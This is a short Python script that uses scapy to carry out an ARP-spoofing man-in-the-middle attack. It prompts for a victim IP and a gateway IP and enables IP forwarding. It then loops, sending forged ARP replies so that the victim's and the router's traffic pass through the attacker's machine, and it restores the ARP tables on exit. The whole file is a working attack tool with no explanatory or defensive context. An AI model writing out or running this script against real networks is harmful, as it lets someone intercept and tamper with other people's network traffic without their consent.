from scapy.all import *
import sys
import os
import time


try:
    interface = input("Enter desired interface: ")
    victim_ip = input("Enter victim IP: ")
    gate_ip = input("Enter router IP: ")

except KeyboardInterrupt:
    print("\n User requested Shutdown")
    print("Exiting...")
    sys.exit(1)

print("Enabling IP Forwarding...\n")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


def get_mac(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=2,
                     iface=interface, inter=0.1)
    print(len(ans))
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")


def reARP():
    print("Restoring targets...")
    victim_MAC = get_mac(victim_ip)
    gate_MAC = get_mac(gate_ip)
    send(ARP(op=2, pdst=gate_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=victim_MAC), count=7)
    send(ARP(op=2, pdst=victim_ip, psrc=gate_ip, hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=gate_MAC), count=7)
    print("Disabling IP Forwarding")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("Shutting down...")
    sys.exit(1)


def trick(gm, vm):
    send(ARP(op=2, pdst=victim_ip, psrc=gate_ip, hwdst=vm))
    send(ARP(op=2, pdst=gate_ip, psrc=victim_ip, hwdst=gm))


def mitm():
    try:
        victim_MAC = get_mac(victim_ip)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("Couldn't find victim MAC address")
        print("Exiting..")
        sys.exit(1)

    try:
        gate_MAC = get_mac(gate_ip)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("Couldn't find gateway MAC address")
        print("Exiting..")
        sys.exit(1)

    print("Poisoning Targets...")
    while 1:
        try:
            trick(gate_MAC, victim_MAC)
            time.sleep(5)
        except KeyboardInterrupt:
            reARP()
            break

mitm()
